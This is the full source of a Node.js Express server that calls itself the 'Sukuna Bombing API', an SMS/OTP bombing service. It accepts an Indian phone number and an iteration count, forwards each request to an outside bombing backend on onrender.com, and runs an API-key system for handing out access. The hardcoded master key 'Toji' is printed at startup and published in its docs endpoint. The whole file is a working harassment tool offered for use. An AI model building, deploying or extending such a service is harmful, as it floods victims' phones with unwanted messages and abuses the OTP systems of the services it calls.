const express = require('express');
const axios = require('axios');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');
const helmet = require('helmet');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(morgan('tiny'));

// API Key Management
const API_KEYS = new Map();
const MAIN_KEY = "Toji";

// Initialize main key (Toji)
API_KEYS.set(MAIN_KEY, {
    id: 1,
    key: MAIN_KEY,
    owner: "System Admin",
    requests: 0,
    limit: 10000,
    createdAt: new Date(),
    isActive: true
});

// Rate limiting per key
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: (req) => {
        const key = req.headers['x-api-key'] || req.headers['authorization'];
        if (key && API_KEYS.has(key)) {
            return API_KEYS.get(key).limit;
        }
        return 100; // Default limit for unauthenticated
    },
    message: {
        success: false,
        error: "Too many requests. Please try again later."
    },
    keyGenerator: (req) => {
        return req.headers['x-api-key'] || req.headers['authorization'] || req.ip;
    }
});

// API Key validation middleware
const validateApiKey = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || 
                   req.headers['authorization']?.replace('Bearer ', '');
    
    if (!apiKey) {
        return res.status(401).json({
            success: false,
            error: "API key required. Use header: x-api-key"
        });
    }
    
    if (!API_KEYS.has(apiKey)) {
        return res.status(401).json({
            success: false,
            error: "Invalid API key"
        });
    }
    
    const keyData = API_KEYS.get(apiKey);
    if (!keyData.isActive) {
        return res.status(403).json({
            success: false,
            error: "API key is inactive"
        });
    }
    
    // Increment request count
    keyData.requests++;
    
    // Attach key data to request
    req.apiKeyData = keyData;
    req.apiKey = apiKey;
    
    next();
};

// Extract client IP (handles proxies)
const getClientIp = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] || 
           req.socket.remoteAddress || 
           req.ip;
};

// Main bombing endpoint
app.post('/api/bomb', apiLimiter, validateApiKey, async (req, res) => {
    try {
        const { phone, iterations = 1 } = req.body;
        
        // Validate input
        if (!phone) {
            return res.status(400).json({
                success: false,
                error: "Phone number is required"
            });
        }
        
        // Validate phone number (basic Indian format)
        const cleanedPhone = phone.toString().replace(/\D/g, '');
        if (cleanedPhone.length !== 10 || !/^[6-9]/.test(cleanedPhone)) {
            return res.status(400).json({
                success: false,
                error: "Invalid phone number format. Must be 10-digit Indian number."
            });
        }
        
        // Validate iterations
        const iterNum = parseInt(iterations);
        if (isNaN(iterNum) || iterNum < 1 || iterNum > 10) {
            return res.status(400).json({
                success: false,
                error: "Iterations must be between 1 and 10"
            });
        }
        
        // Get client IP automatically
        const clientIp = getClientIp(req);
        
        // Prepare payload for internal system
        const payload = {
            phone: cleanedPhone,
            ip: clientIp,
            iterations: iterNum,
            timestamp: new Date().toISOString(),
            requestId: crypto.randomBytes(8).toString('hex')
        };
        
        console.log(`🚀 Attack initiated:`, {
            requestId: payload.requestId,
            phone: cleanedPhone,
            ip: clientIp,
            iterations: iterNum,
            key: req.apiKeyData.owner
        });
        
        // Simulate attack processing
        await processAttack(payload);
        
        // Return success response
        res.json({
            success: true,
            message: "Attack successfully deployed",
            data: {
                requestId: payload.requestId,
                target: cleanedPhone,
                iterations: iterNum,
                status: "active",
                estimatedCompletion: "2-5 minutes"
            },
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error("Attack error:", error);
        res.status(500).json({
            success: false,
            error: "Failed to deploy attack. Please try again.",
            debug: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});

// Attack processing function
async function processAttack(payload) {
    // This is where we would call the actual service
    // For now, we'll simulate it
    try {
        // Call the actual bombing API
        const response = await axios.post('https://aivoratechbomber-2077.onrender.com/api/bomb', {
            phone: payload.phone,
            ip: payload.ip,
            iterations: payload.iterations
        }, {
            timeout: 30000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        console.log(`✅ Attack processed successfully for ${payload.phone}`);
        return response.data;
    } catch (error) {
        console.error("Backend service error:", error.message);
        // We don't throw here to keep the proxy transparent
        return { internalError: true, message: error.message };
    }
}

// API Key management endpoints (protected)
app.post('/api/keys/generate', validateApiKey, (req, res) => {
    // Only main key (Toji) can generate new keys
    if (req.apiKey !== MAIN_KEY) {
        return res.status(403).json({
            success: false,
            error: "Only main key can generate new keys"
        });
    }
    
    const { owner, limit = 1000 } = req.body;
    
    if (!owner) {
        return res.status(400).json({
            success: false,
            error: "Owner name is required"
        });
    }
    
    // Generate new key
    const newKey = crypto.randomBytes(32).toString('hex');
    const keyId = Date.now();
    
    API_KEYS.set(newKey, {
        id: keyId,
        key: newKey,
        owner: owner,
        requests: 0,
        limit: parseInt(limit),
        createdAt: new Date(),
        isActive: true
    });
    
    res.json({
        success: true,
        message: "API key generated successfully",
        key: newKey,
        owner: owner,
        limit: limit,
        createdAt: new Date().toISOString()
    });
});

app.get('/api/keys/list', validateApiKey, (req, res) => {
    if (req.apiKey !== MAIN_KEY) {
        return res.status(403).json({
            success: false,
            error: "Only main key can list all keys"
        });
    }
    
    const keys = [];
    API_KEYS.forEach((data, key) => {
        keys.push({
            id: data.id,
            owner: data.owner,
            requests: data.requests,
            limit: data.limit,
            createdAt: data.createdAt,
            isActive: data.isActive,
            key: key === MAIN_KEY ? "Toji (Master)" : "••••" + key.slice(-8)
        });
    });
    
    res.json({
        success: true,
        keys: keys
    });
});

app.put('/api/keys/:keyId/status', validateApiKey, (req, res) => {
    if (req.apiKey !== MAIN_KEY) {
        return res.status(403).json({
            success: false,
            error: "Only main key can modify keys"
        });
    }
    
    const { keyId } = req.params;
    const { isActive } = req.body;
    
    let found = false;
    API_KEYS.forEach((data, key) => {
        if (data.id == keyId || key === keyId) {
            data.isActive = isActive;
            found = true;
        }
    });
    
    if (!found) {
        return res.status(404).json({
            success: false,
            error: "Key not found"
        });
    }
    
    res.json({
        success: true,
        message: `Key ${isActive ? 'activated' : 'deactivated'} successfully`
    });
});

// Stats endpoint
app.get('/api/stats', validateApiKey, (req, res) => {
    const totalRequests = Array.from(API_KEYS.values())
        .reduce((sum, key) => sum + key.requests, 0);
    
    res.json({
        success: true,
        stats: {
            totalKeys: API_KEYS.size,
            totalRequests: totalRequests,
            activeKeys: Array.from(API_KEYS.values()).filter(k => k.isActive).length,
            yourRequests: req.apiKeyData.requests,
            yourKey: req.apiKeyData.owner
        }
    });
});

// Documentation endpoint
app.get('/api/docs', (req, res) => {
    res.json({
        name: "Sukuna Bombing API",
        version: "2.0.1",
        description: "Advanced SMS/OTP Bombing Service",
        endpoints: {
            "POST /api/bomb": {
                description: "Initiate bombing attack",
                headers: {
                    "x-api-key": "Your API key"
                },
                body: {
                    phone: "10-digit mobile number",
                    iterations: "Number of attacks (1-10, default: 1)"
                },
                note: "Client IP is automatically detected"
            },
            "GET /api/stats": "Get your usage statistics",
            "POST /api/keys/generate": "Generate new API keys (Toji key only)",
            "GET /api/keys/list": "List all API keys (Toji key only)"
        },
        authentication: "All endpoints require x-api-key header",
        mainKey: "Use 'Toji' as the main API key"
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: "operational",
        service: "Sukuna Bombing API",
        version: "2.0.1",
        timestamp: new Date().toISOString()
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: "Endpoint not found. Check /api/docs for available endpoints."
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        success: false,
        error: "Internal server error"
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
    ⚡️  Sukuna Bombing API v2.0.1
    📍 Port: ${PORT}
    🔑 Main Key: ${MAIN_KEY}
    🚀 Ready for deployment
    
    API Documentation: http://localhost:${PORT}/api/docs
    Health Check: http://localhost:${PORT}/health
    `);
});